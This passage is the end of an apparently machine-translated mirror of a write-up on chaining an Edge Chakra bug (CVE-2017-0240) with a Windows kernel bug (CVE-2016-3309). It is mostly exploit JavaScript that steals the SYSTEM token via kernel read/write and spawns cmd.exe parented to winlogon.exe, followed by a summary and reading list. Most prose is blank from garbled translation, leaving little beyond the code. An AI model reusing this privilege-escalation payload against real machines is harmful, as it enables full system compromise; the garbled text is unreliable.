<span class="hljs-keyword">var</span> pinfo_sz = Uint64.Ptr.cast(malloc(<span class="hljs-number">8</span>));<font></font>
NtQueryInformationProcess(GetCurrentProcess(), <span class="hljs-number">0</span>, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz);
<span class="hljs-keyword">var</span> peb = pinfo.PebBaseAddress;
<span class="hljs-comment">/*    IsPackagedProcess   
   peb   char * */</span>
<span class="hljs-keyword">var</span> bit_field = peb[<span class="hljs-number">3</span>];<font></font>
bit_field = bit_field.xor(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>);<font></font>
peb[<span class="hljs-number">3</span>] = bit_field;<font></font>
<font></font>
<span class="hljs-comment">/*          
  WinDbg    .     :
dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks
          */</span>
<span class="hljs-keyword">var</span> ActiveProcessLinks = system_eprocess.add(<font></font>
        g_config.ActiveProcessLinksOffset);<font></font>
<span class="hljs-keyword">var</span> current_pid = GetCurrentProcessId();
<span class="hljs-keyword">var</span> current_eprocess = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">var</span> winlogon_pid = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// winlogon.exe -  ,     cmd.exe</span>
<span class="hljs-keyword">var</span> winlogon = <span class="hljs-keyword">new</span> CString(<span class="hljs-string">"winlogon.exe"</span>);
<span class="hljs-keyword">var</span> image_name = malloc(<span class="hljs-number">16</span>);
<span class="hljs-keyword">var</span> system_pid = kernel_read_64(system_eprocess.add(<font></font>
            g_config.UniqueProcessIdOffset));<font></font>
<span class="hljs-keyword">while</span>(!current_eprocess || !winlogon_pid)<font></font>
{<font></font>
    <span class="hljs-keyword">var</span> eprocess = kernel_read_64(ActiveProcessLinks).sub(<font></font>
            g_config.ActiveProcessLinksOffset);<font></font>
    <span class="hljs-keyword">var</span> pid = kernel_read_64(eprocess.add(<font></font>
                g_config.UniqueProcessIdOffset));<font></font>
<font></font>
    <span class="hljs-comment">//       </span>
    <span class="hljs-comment">//  </span><font></font>
    Uint64.store(<font></font>
        image_name.address,<font></font>
        kernel_read_64(eprocess.add(g_config.ImageNameOffset))<font></font>
    );<font></font>
    Uint64.store(<font></font>
        image_name.address.add(<span class="hljs-number">8</span>),<font></font>
        kernel_read_64(eprocess.add(g_config.ImageNameOffset + <span class="hljs-number">8</span>))<font></font>
    );<font></font>
<font></font>
    <span class="hljs-comment">//   winlogon.exe   </span>
    <span class="hljs-keyword">if</span>(_stricmp(winlogon, image_name).eq(<span class="hljs-number">0</span>))<font></font>
    {<font></font>
        winlogon_pid = pid;<font></font>
    }<font></font>
    <span class="hljs-keyword">if</span> (current_pid.eq(pid))<font></font>
    {<font></font>
        current_eprocess = eprocess;<font></font>
    }<font></font>
<font></font>
    <span class="hljs-comment">//       </span><font></font>
    ActiveProcessLinks = eprocess.add(<font></font>
            g_config.ActiveProcessLinksOffset);<font></font>
}<font></font>
<font></font>
<span class="hljs-comment">//    </span>
<span class="hljs-keyword">var</span> sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset));<font></font>
<font></font>
<span class="hljs-comment">//         </span>
<span class="hljs-comment">//   winlogon.exe</span>
<span class="hljs-keyword">var</span> pi = malloc(<span class="hljs-number">24</span>);<font></font>
memset(pi, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>);
<span class="hljs-keyword">var</span> si = malloc(<span class="hljs-number">104</span> + <span class="hljs-number">8</span>);<font></font>
memset(si, <span class="hljs-number">0</span>, <span class="hljs-number">104</span> + <span class="hljs-number">8</span>);<font></font>
Uint32.store(si.address, <span class="hljs-keyword">new</span> Integer(<span class="hljs-number">104</span> + <span class="hljs-number">8</span>));
<span class="hljs-keyword">var</span> args = WString(<span class="hljs-string">"cmd.exe"</span>);<font></font>
<font></font>
<span class="hljs-keyword">var</span> AttributeListSize = Uint64.Ptr.cast(malloc(<span class="hljs-number">8</span>));<font></font>
InitializeProcThreadAttributeList(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, AttributeListSize);
<span class="hljs-keyword">var</span> lpAttributeList = malloc(AttributeListSize[<span class="hljs-number">0</span>]);<font></font>
Uint64.store(<font></font>
    si.address.add(<span class="hljs-number">104</span>),<font></font>
    lpAttributeList<font></font>
);<font></font>
InitializeProcThreadAttributeList(lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, AttributeListSize)
<span class="hljs-keyword">var</span> winlogon_handle = Uint64.Ptr.cast(malloc(<span class="hljs-number">8</span>));<font></font>
<font></font>
<span class="hljs-comment">//      </span><font></font>
kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token);<font></font>
<font></font>
<span class="hljs-comment">/*        AppContainer,
      winlogon.exe  
      winlogon.exe */</span>
winlogon_handle[<span class="hljs-number">0</span>] = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, winlogon_pid);<font></font>
UpdateProcThreadAttribute(lpAttributeList, <span class="hljs-number">0</span>,<font></font>
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,<font></font>
        winlogon_handle, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<font></font>
CreateProcess(<span class="hljs-number">0</span>, args, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, si, pi);</code></pre><br>
<p>    :</p><br>
<p><img src="https://habrastorage.org/webt/r4/4j/lm/r44jlmrlc0reurbxe-rosf1cicu.png" alt="最後の"></p><br>
<p>  YouTube    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="></a>  ,     Microsoft Edge.</p><br>
<h2 id="itog"></h2><br>
<p>  :</p><br>
<ul>
<li>,       <code>Edge</code>   <code>Windows</code>,   13   ,        <code>CVE-2017-0240</code>  ,   .          <code>CVE-2016-3309</code>.</li>
<li>     <code>JS</code></li>
<li>   666    <code>JS</code></li>
<li>  :  <code>cmd.exe</code>    <code>SYSTEM</code>,       </li>
</ul><br>
<p>  ,         ,                 .  ,       ,         .        .</p><br>
<h2 id="materialy"></h2><br>
<ol>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Liu Jin — The Advanced Exploitation of 64-bit Edge Browser Use-After-Free Vulnerability on Windows 10</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Andrew Wesie, Brian Pak — 1-Day Browser &amp; Kernel<br>
Exploitation</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Natalie Silvanovich — The ECMA and the Chakra. Hunting bugs in the Microsoft Edge Script Engine</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Natalie Silvanovich — Your Chakra Is Not Aligned. Hunting bugs in the Microsoft Edge Script Engine</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">phoenhex team — cve-2018-8629-chakra.js</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Quarkslab — Exploiting MS16-145: MS Edge TypedArray.sort Use-After-Free (CVE-2016-7288)</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Siberas — Kernel Exploitation Case Study — "Wild" Pool Overflow on Win10 x64 RS2 (CVE-2016-3309 Reloaded)</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Saif El-Sherei — Demystifying Windows Kernel Exploitation by Abusing GDI Objects</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Diego Juarez — Abusing GDI for ring0 exploit primitives</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">Nicolas A. Economou — Abusing GDI for ring0 exploit<br>
primitives: Evolution</a></li>
<li><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=">pwn.js</a></li>
</ol></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja455584/index.html">会社の内部力とのカスタムインタビュー：エラーから発見まで</a></li>
<li><a href="../ja455586/index.html">ドイツ、ボーフムの神経情報学研究所（INI）所長、グレゴールシェーナー教授によるロボット工学の講義シリーズ</a></li>
<li><a href="../ja455588/index.html">タンバリンと踊らないようにコミュニティを教育する方法</a></li>
<li><a href="../ja455590/index.html">PostgreSQL-8のMVCC。凍結</a></li>
<li><a href="../ja455592/index.html">物理的セキュリティへの脅威として産業企業を攻撃するウイルス</a></li>
<li><a href="../ja455596/index.html">DevConfX ::管理-簡単な言葉での管理レポート</a></li>
<li><a href="../ja455598/index.html">Eximを4.92に早急にアップグレードします-アクティブな感染があります</a></li>
<li><a href="../ja455600/index.html">3DEXPERIENCEプラットフォームが未来の公共交通機関の構築を支援</a></li>
<li><a href="../ja455602/index.html">挑発的なブラウザが行動ファジングでクラッシュする</a></li>
<li><a href="../ja455604/index.html">Windows構成を管理するためのAnsible。成功の歴史</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>